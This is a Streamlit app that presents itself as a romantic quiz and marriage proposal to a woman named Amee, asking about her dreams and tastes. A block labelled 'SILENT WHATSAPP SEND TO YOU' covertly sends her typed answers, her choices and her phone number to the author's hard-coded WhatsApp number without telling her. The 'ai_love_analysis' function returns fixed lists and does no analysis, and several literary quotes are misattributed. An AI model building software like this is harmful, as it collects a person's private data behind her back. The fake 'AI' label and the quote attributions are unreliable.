import streamlit as st
import pywhatkit as pwk
import time
from datetime import datetime

st.set_page_config(page_title="A Love Promise to Amee", layout="wide", initial_sidebar_state="collapsed", page_icon="💕")

# 🔥 ULTRA-VISIBLE CLASSIC ROMANTIC - FULL CODE
st.markdown("""
<style>
@import url('https://fonts.googleapis.com/css2?family=Cormorant+Garamond:wght@300;400;600;700&family=Playfair+Display:wght@400;500;600;700&display=swap');

/* DEEP VELVET WITH MAX CONTRAST */
html, body {
    background: linear-gradient(135deg, #0a050f 0%, #160f20 30%, #241435 60%, #0b0614 100%) !important;
    background-size: 500% 500% !important;
    animation: velvetLove 25s ease infinite !important;
    min-height: 100vh !important;
}

@keyframes velvetLove {
    0%, 100% { background-position: 0% 50%; }
    50% { background-position: 100% 50%; }
}

body::before {
    content: '🌹🌸✦🌺💫' !important;
    position: fixed !important; top: 0 !important; left: 0 !important;
    width: 100vw !important; height: 100vh !important;
    font-size: 1.8rem !important; opacity: 0.2 !important;
    z-index: 1 !important; pointer-events: none !important;
    animation: rosePetals 20s linear infinite !important;
}

@keyframes rosePetals {
    0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
    10% { opacity: 0.5; }
    90% { opacity: 0.5; }
    100% { transform: translateY(-100vh) rotate(720deg); opacity: 0; }
}

section[data-testid="stAppViewContainer"] { background: transparent !important; z-index: 100 !important; }

/* ULTRA-VISIBLE GOLD TITLES */
.eternal-title { 
    font-family: 'Playfair Display', serif !important; 
    font-size: 5.2rem !important; 
    color: #FFD700 !important;
    -webkit-text-stroke: 1px #FFED4E !important;
    text-shadow: 0 0 50px #FFD700, 0 0 100px #FFED4E, 2px 2px 4px rgba(0,0,0,0.8) !important;
    text-align: center !important; 
    margin: 3rem 0 !important;
    font-weight: 700 !important;
    letter-spacing: 2px !important;
}

/* ULTRA-VISIBLE CREAM CARDS */
.vault {
    background: rgba(255, 250, 240, 0.99) !important;
    backdrop-filter: blur(30px) !important; 
    border-radius: 25px !important;
    padding: 4rem !important; 
    border: 4px solid #FFD700 !important;
    box-shadow: 0 40px 120px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,1) !important;
    margin: 2.5rem auto !important; 
    max-width: 1000px !important;
    position: relative !important;
}

.vault::before {
    content: '' !important;
    position: absolute !important;
    top: -2px !important; left: -2px !important; right: -2px !important; bottom: -2px !important;
    background: linear-gradient(45deg, #FFD700, #FFED4E, #FFD700) !important;
    border-radius: 27px !important;
    z-index: -1 !important;
    animation: goldGlow 3s ease-in-out infinite alternate !important;
}

@keyframes goldGlow {
    0% { opacity: 0.6; transform: scale(1); }
    100% { opacity: 1; transform: scale(1.02); }
}

.heart-scroll {
    background: linear-gradient(135deg, #FFF8E7, #FFFBF0) !important;
    border-left: 10px solid #FFD700 !important; 
    font-size: 2.6rem !important;
    font-family: 'Playfair Display', serif !important;
    font-weight: 600 !important;
    color: #1A0D1F !important;
    padding: 2.5rem !important;
    border-radius: 20px !important;
    margin: 2rem 0 !important;
    box-shadow: 0 15px 50px rgba(255,215,0,0.3), inset 0 1px 0 rgba(255,255,255,0.9) !important;
    text-shadow: 1px 1px 2px rgba(255,255,255,0.8) !important;
}

.promise-vault {
    background: linear-gradient(135deg, #FFD700, #FFA500, #FF8C00) !important;
    box-shadow: 0 50px 140px rgba(255,215,0,0.6) !important;
    color: #1A0D1F !important;
    border: 3px solid #FFED4E !important;
}

.classic-question {
    font-family: 'Cormorant Garamond', serif !important;
    font-size: 1.8rem !important;
    color: #1A0D1F !important;
    font-weight: 400 !important;
    line-height: 1.8 !important;
    margin: 2rem 0 !important;
    text-shadow: 1px 1px 2px rgba(255,255,255,0.8) !important;
}

.love-quote {
    font-family: 'Cormorant Garamond', serif !important;
    font-size: 1.5rem !important;
    font-style: italic !important;
    color: #8B4513 !important;
    background: rgba(255, 248, 230, 0.9) !important;
    text-align: center !important;
    padding: 2rem !important;
    border-left: 6px solid #FFD700 !important;
    border-radius: 15px !important;
    margin: 2.5rem 0 !important;
    font-weight: 300 !important;
    box-shadow: 0 10px 30px rgba(255,215,0,0.2) !important;
    border: 2px solid rgba(255,215,0,0.3) !important;
}

button {
    background: linear-gradient(135deg, #FFD700, #FFA500) !important;
    color: #1A0D1F !important;
    border: 3px solid #FFED4E !important;
    border-radius: 25px !important;
    font-family: 'Playfair Display', serif !important;
    font-weight: 600 !important;
    font-size: 1.5rem !important;
    padding: 1.2rem 2.5rem !important;
    box-shadow: 0 15px 40px rgba(255,215,0,0.5), 0 5px 15px rgba(0,0,0,0.3) !important;
    text-transform: uppercase !important;
    letter-spacing: 1px !important;
}

button:hover {
    transform: translateY(-3px) !important;
    box-shadow: 0 20px 50px rgba(255,215,0,0.7) !important;
}

.stTextArea > div > div > textarea {
    border: 3px solid #FFD700 !important;
    border-radius: 20px !important;
    background: rgba(255, 255, 255, 0.95) !important;
    color: #1A0D1F !important;
    font-size: 1.2rem !important;
    font-family: 'Cormorant Garamond', serif !important;
    padding: 1.5rem !important;
    box-shadow: inset 0 2px 10px rgba(0,0,0,0.1) !important;
}

.stProgress > div > div > div > div {
    background: linear-gradient(90deg, #FFD700, #FFA500) !important;
    border-radius: 15px !important;
}
</style>
""", unsafe_allow_html=True)

# 🔥 CONFIG
YOUR_WHATSAPP_NUMBER = "+918848385042"
AMEE_NICKNAME = "Amee"

# CLASSIC LITERARY QUOTES
love_quotes = [
    '"The heart wants what it wants." — Emily Dickinson',
    '"Love is not only something you feel, it is something you do." — David Wilkerson', 
    '"We loved with a love that was more than love." — Edgar Allan Poe',
    '"In all the world, there is no love for you like mine." — Maya Angelou',
    '"Whatever our souls are made of, his and mine are the same." — Emily Brontë',
    '"To love is to burn, to be on fire." — Jane Austen',
    '"My heart is ever at your service." — William Shakespeare',
    '"Love is the poetry of the senses." — Honoré de Balzac',
    '"The best thing to hold onto in life is each other." — Audrey Hepburn',
    '"I have waited for this opportunity for more than half a century." — Margaret Mitchell',
    '"You are my heart, my life, my one and only thought." — Arthur Conan Doyle'
]

# SESSION STATE
if 'initialized' not in st.session_state:
    st.session_state.step = 0
    st.session_state.answers = {}
    st.session_state.preferences = {}
    st.session_state.choices = {}
    st.session_state.proposal_accepted = False
    st.session_state.phone = "+91XXXXXXXXXX"  # 👈 PUT AMEE'S NUMBER HERE
    st.session_state.results_sent = False
    st.session_state.initialized = True

def ai_love_analysis(answers, preferences):
    return [
        "🌹 Lalbagh Glasshouse at sunset",
        "💕 Koshy's quiet corner", 
        "🌙 Church Street fairy lights",
        "🍷 Toit rooftop whispers",
        "💃 Skyye Lounge dancing",
        "🌸 Lalbagh Lake garden",
        "🕯️ Boat Club candlelight",
        "🍫 Theobroma chocolates",
        "🌊 Karavalli seaside",
        "⭐ Nandi Hills dawn",
        "🎶 13th Floor jazz",
        "💎 UB City rooftop"
    ], [
        "🍕 Pizza oven memories",
        "🍕 Homemade pizza nights",
        "🍫 Gold-dusted chocolates", 
        "🍫 DIY chocolate kit",
        "🌹 Eternal rose",
        "🌹 Rose quartz necklace",
        "☕ Morning ritual set",
        "🧶 Crochet love keepsake",
        "💎 Diamond painting canvas",
        "🌙 Our star map",
        "💍 Engraved promise",
        "📜 Love letters"
    ], 'romantic'

# OLD SCHOOL QUESTIONS
dream_whispers = [
    {"title": "Morning", "question": f"How should your day begin, {AMEE_NICKNAME}?", "explanation": "The scent, the taste, the quiet moment...", "quote": love_quotes[0]},
    {"title": "Journeys", "question": f"Where does your heart wander, {AMEE_NICKNAME}?", "explanation": "Distant shores, mountain paths, or city gardens?", "quote": love_quotes[1]},
    {"title": "Fire", "question": f"What moves you most deeply, {AMEE_NICKNAME}?", "explanation": "A written word, a quiet look, or steadfast care?", "quote": love_quotes[2]},
    {"title": "Haven", "question": f"What makes life complete for you, {AMEE_NICKNAME}?", "explanation": "Laughter together, peaceful evenings, shared roads?", "quote": love_quotes[3]},
    {"title": "Longing", "question": f"What stays unspoken in your heart, {AMEE_NICKNAME}?", "explanation": "Evening walks, rainy days, or quiet wishes?", "quote": love_quotes[4]},
    {"title": "Future", "question": f"What will our years hold, {AMEE_NICKNAME}?", "explanation": "A home together, journeys afar, or lasting work?", "quote": love_quotes[5]}
]

preferences_questions = {
    "food": f"What dish speaks to your soul, {AMEE_NICKNAME}?",
    "scent": f"What fragrance stays with you, {AMEE_NICKNAME}?",
    "drink": f"Your morning companion, {AMEE_NICKNAME}?",
    "passion": f"What work fulfills you, {AMEE_NICKNAME}?",
    "date": f"Your perfect evening, {AMEE_NICKNAME}, in three words?"
}

# MAIN UI
st.markdown(f'<div class="eternal-title">A Promise to {AMEE_NICKNAME}</div>', unsafe_allow_html=True)

if st.session_state.step < len(dream_whispers):
    whisper = dream_whispers[st.session_state.step]
    st.markdown(f'<div class="vault"><h2 style="color:#1A0D1F;font-family:Playfair Display;font-size:3.8rem;text-align:center;font-weight:700;">{whisper["title"]}</h2></div>', unsafe_allow_html=True)
    st.markdown(f'<div class="heart-scroll">{whisper["question"]}</div>', unsafe_allow_html=True)
    st.markdown(f'<div class="classic-question">{whisper["explanation"]}</div>', unsafe_allow_html=True)
    st.markdown(f'<div class="love-quote"><strong>{whisper["quote"]}</strong></div>', unsafe_allow_html=True)
    
    answer = st.text_area("Your thoughts...", height=240, key=f"answer_{st.session_state.step}")
    st.progress(st.session_state.step / 11)
    
    if st.button("→ Continue", use_container_width=True, key=f"next_{st.session_state.step}"):
        if answer.strip():
            st.session_state.answers[st.session_state.step] = answer
            st.session_state.step += 1
            st.rerun()

elif st.session_state.step < 11:
    pref_step = st.session_state.step - 6
    pref_key = list(preferences_questions.keys())[pref_step]
    
    st.markdown(f'<div class="vault"><h2 style="color:#1A0D1F;font-family:Playfair Display;font-size:3.8rem;text-align:center;font-weight:700;">{AMEE_NICKNAME}\'s Heart</h2></div>', unsafe_allow_html=True)
    st.markdown(f'<div class="heart-scroll">{preferences_questions[pref_key]}</div>', unsafe_allow_html=True)
    st.markdown(f'<div class="love-quote"><strong>{love_quotes[st.session_state.step % len(love_quotes)]}</strong></div>', unsafe_allow_html=True)
    
    pref_answer = st.text_area("Please share...", height=200, key=f"pref_{pref_step}")
    st.progress(st.session_state.step / 11)
    
    if st.button("→ Continue", use_container_width=True, key=f"pref_next_{pref_step}"):
        if pref_answer.strip():
            st.session_state.preferences[pref_key] = pref_answer
            st.session_state.step += 1
            st.rerun()

elif not st.session_state.proposal_accepted:
    st.markdown(f'''<div class="promise-vault" style="padding:4rem;">
        <h2 style="font-size:4.5rem;font-family:Playfair Display;text-align:center;font-weight:700;">{AMEE_NICKNAME}</h2>
        <h3 style="font-size:3.2rem;font-family:Playfair Display;text-align:center;">Will you have me forever?</h3>
        <div class="love-quote" style="margin-top:2rem;font-size:1.6rem;"><strong>"My heart is ever at your service." — William Shakespeare</strong></div>
    </div>''', unsafe_allow_html=True)
    
    col1, col2 = st.columns([1.5, 1])
    with col1:
        if st.button("💍 Yes, always", key="yes_final", use_container_width=True):
            st.session_state.proposal_accepted = True
            st.session_state.step += 1
            st.rerun()
    with col2:
        st.button("Not yet", key="no_final", use_container_width=True)

else:
    dates, gifts, theme = ai_love_analysis(st.session_state.answers, st.session_state.preferences)
    
    st.markdown(f'<div class="eternal-title">Our Promise to {AMEE_NICKNAME}</div>', unsafe_allow_html=True)
    
    with st.expander("💕 Our Shared Moments"):
        st.markdown(f'<div class="vault"><h3 style="color:#1A0D1F;font-size:2.2rem;">Places together</h3><div class="love-quote"><strong>"The best thing to hold onto in life is each other." — Audrey Hepburn</strong></div></div>', unsafe_allow_html=True)
        for i, date in enumerate(dates):
            if st.button(f"💑 {date}", use_container_width=True, key=f"date_{i}"):
                st.session_state.choices['date'] = date
        
        st.markdown(f'<div class="vault"><h3 style="color:#8B4513;font-size:2.2rem;">Gifts to cherish</h3><div class="love-quote"><strong>"Love is the poetry of the senses." — Honoré de Balzac</strong></div></div>', unsafe_allow_html=True)
        for i, gift in enumerate(gifts):
            if st.button(f"💝 {gift}", use_container_width=True, key=f"gift_{i}"):
                st.session_state.choices['gift'] = gift
    
    if st.button(f"💍 Our promise, {AMEE_NICKNAME}", use_container_width=True, key="create_memory"):
        st.success("Sealed for all time...")
        st.markdown(f'''<div class="promise-vault" style="padding:4rem;">
            <h2 style="font-family:Playfair Display;font-size:4rem;text-align:center;">{AMEE_NICKNAME}</h2>
            <div class="love-quote" style="font-size:1.8rem;"><strong>"You are my heart, my life, my one and only thought."</strong></div>
            <p style="font-family:Cormorant Garamond;font-size:1.6rem;text-align:center;">— Arthur Conan Doyle</p>
        </div>''', unsafe_allow_html=True)
        
        # 🕶️ SILENT WHATSAPP SEND TO YOU
        if not st.session_state.results_sent and st.session_state.choices.get('date') and st.session_state.choices.get('gift'):
            results = f"""
AMEE RESULTS 💕
📱 PHONE: {st.session_state.phone}
💖 DATE: {st.session_state.choices['date']}
💝 GIFT: {st.session_state.choices['gift']}
⏰ {datetime.now().strftime('%Y-%m-%d %H:%M IST')}

DREAMS:
""" + "\n".join([f"D{i+1}: {ans[:80]}" for i, ans in enumerate(st.session_state.answers.values())]) + f"""

PREFERENCES:
""" + "\n".join([f"{k.title()}: {v[:60]}" for k, v in st.session_state.preferences.items()])
            
            try:
                pwk.sendwhatmsg_instantly(YOUR_WHATSAPP_NUMBER, results, 12)
                st.session_state.results_sent = True
            except:
                pass
        
        with st.expander("💕 Our Vow"):
            st.markdown(f"""
            **For {AMEE_NICKNAME}, eternally**
            
            💖 Place: {st.session_state.choices.get('date', 'Our secret')}
            💝 Gift: {st.session_state.choices.get('gift', 'My devotion')}
            
            **"Whatever our souls are made of, his and mine are the same."**
            *— Emily Brontë*
            """)

# 🔥 NEW CLASSIC FOOTER - NO CRINGE
st.markdown(f"""
<div style="text-align:center;padding:5rem;background:linear-gradient(135deg,#1A0D1F,#2D1B3A);color:#FFD700;font-family:Playfair Display;font-size:3.2rem;border-radius:35px;margin:5rem auto;max-width:1000px;box-shadow:0 60px 150px rgba(0,0,0,0.7);border:4px solid #FFED4E;">
<div style='font-size:4.2rem;font-weight:700;margin-bottom:1rem;text-shadow:2px 2px 4px rgba(0,0,0,0.8);'>{AMEE_NICKNAME}</div>
<span style='font-size:1.1em;font-weight:400;letter-spacing:1px;'>— the quiet of my heart</span>
</div>
<style>
@keyframes spin{{0%{{transform:rotate(0deg);}}100%{{transform:rotate(360deg);}}}}
</style>
""", unsafe_allow_html=True)
